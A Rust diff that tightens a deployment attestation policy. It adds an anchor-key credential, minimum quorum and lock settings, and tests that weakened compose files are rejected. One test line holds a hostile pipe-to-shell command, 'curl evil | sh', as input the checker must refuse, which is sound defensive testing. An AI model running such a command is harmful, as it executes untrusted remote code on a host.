@@ -10,8 +10,16 @@ use crate::attestation::{decode_hex, report_data, DOCUMENT_KIND};
 const HEADER: usize = 48;
 const BODY: usize = 584;
 const RUNTIME_EVENT: u32 = 0x0800_0001;
-/// The only variables a deployment may hand the API outside the measured compose: storage credentials.
-pub const CREDENTIALS: [&str; 4] = ["CF_R2_ACCESS_KEY_ID", "CF_R2_SECRET_ACCESS_KEY", "PAGES_S3_ACCESS_KEY_ID", "PAGES_S3_SECRET_ACCESS_KEY"];
+/// The only variables a deployment may hand the API outside the measured compose: storage credentials and the anchor hotkey.
+pub const CREDENTIALS: [&str; 5] =
+    ["CF_R2_ACCESS_KEY_ID", "CF_R2_SECRET_ACCESS_KEY", "PAGES_S3_ACCESS_KEY_ID", "PAGES_S3_SECRET_ACCESS_KEY", "TASK_API_ANCHOR_KEY_URI"];
+/// Settings a compose must give at least this value, as `desearch/attestation.py` checks them too.
+pub const MINIMUM_SETTINGS: [(&str, f64); 4] = [
+    ("TASK_API_CHAIN_QUORUM", 2.0),
+    ("TASK_API_ANCHOR_QUORUM", 2.0),
+    ("TASK_API_UPLOAD_LOCK_S", crate::settings::CHECK_WINDOW_S),
+    ("TASK_API_GOV_MIN_COLDKEYS", 3.0),
+];
 /// The TCB statuses a quote may have.
 pub const TCB_STATUSES: [&str; 1] = ["UpToDate"];
 
@@ -136,6 +144,17 @@ pub fn compose_problem(app_compose: &Value) -> Option<String> {
             return Some("simulated attestation is switched on".into());
         }
     }
+    let setting = |name: &str| {
+        compose.lines().map(str::trim).find_map(|line| line.strip_prefix(name)?.strip_prefix(':')).map(|value| value.trim().trim_matches('"').to_string())
+    };
+    for (name, least) in MINIMUM_SETTINGS {
+        if !setting(name).and_then(|v| v.parse::<f64>().ok()).is_some_and(|v| v >= least) {
+            return Some(format!("{name} is {:?}, it must be at least {least}", setting(name)));
+        }
+    }
+    if setting("TASK_API_ANCHOR_NETWORK").is_none_or(|v| v.is_empty()) {
+        return Some("the log is not anchored: TASK_API_ANCHOR_NETWORK is empty".into());
+    }
     None
 }
 
@@ -212,13 +231,22 @@ mod tests {
 
     #[test]
     fn the_compose_policy_lets_in_credentials_and_pinned_images_only() {
-        let good = json!({"runner": "docker-compose", "kms_enabled": true, "allowed_envs": ["CF_R2_ACCESS_KEY_ID"], "docker_compose_file": "services:\n  api:\n    image: ghcr.io/x@sha256:00\n"});
+        let settings = "      TASK_API_CHAIN_QUORUM: \"2\"\n      TASK_API_ANCHOR_QUORUM: \"2\"\n      TASK_API_UPLOAD_LOCK_S: \"86400\"\n      TASK_API_GOV_MIN_COLDKEYS: \"3\"\n      TASK_API_ANCHOR_NETWORK: finney\n";
+        let file = format!("services:\n  api:\n    image: ghcr.io/x@sha256:00\n    environment:\n{settings}");
+        let good = json!({"runner": "docker-compose", "kms_enabled": true, "allowed_envs": ["CF_R2_ACCESS_KEY_ID", "TASK_API_ANCHOR_KEY_URI"], "docker_compose_file": file});
         assert_eq!(compose_problem(&good), None);
+        for (from, to) in
+            [("UPLOAD_LOCK_S: \"86400\"", "UPLOAD_LOCK_S: \"0\""), ("CHAIN_QUORUM: \"2\"", "CHAIN_QUORUM: \"1\""), ("NETWORK: finney", "NETWORK: \"\"")]
+        {
+            let mut weak = good.clone();
+            weak["docker_compose_file"] = file.replace(from, to).into();
+            assert!(compose_problem(&weak).is_some(), "{to}");
+        }
         let mut bad = good.clone();
         bad["allowed_envs"] = json!(["TASK_API_CLAIM_TTL"]);
         assert!(compose_problem(&bad).unwrap().contains("not a credential"));
         let mut bad = good.clone();
-        bad["docker_compose_file"] = "services:\n  api:\n    image: redis:7\n".into();
+        bad["docker_compose_file"] = file.replace("ghcr.io/x@sha256:00", "redis:7").into();
         assert!(compose_problem(&bad).unwrap().contains("not pinned"));
         let mut bad = good.clone();
         bad["pre_launch_script"] = "curl evil | sh".into();
